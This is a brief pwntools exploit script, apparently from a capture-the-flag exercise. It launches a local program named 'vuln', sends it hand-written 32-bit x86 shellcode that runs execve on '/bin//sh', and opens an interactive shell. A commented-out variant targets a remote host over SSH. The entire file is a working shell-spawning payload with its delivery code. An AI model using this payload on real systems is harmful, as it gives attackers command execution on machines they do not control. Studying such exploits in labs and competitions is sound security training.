from pwn import *

# ssh
#sh = ssh(host="address", user="", password="xxx")
# r=sh.process("//address")

r = process("./vuln")

payload= "\x31\xC0\x31\xD2\x31\xC9\x83\xC0\x0B\x31\xDB\x53\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\xCD\x80"#int 0x80 = syscall

r.sendline(payload)
r.interactive()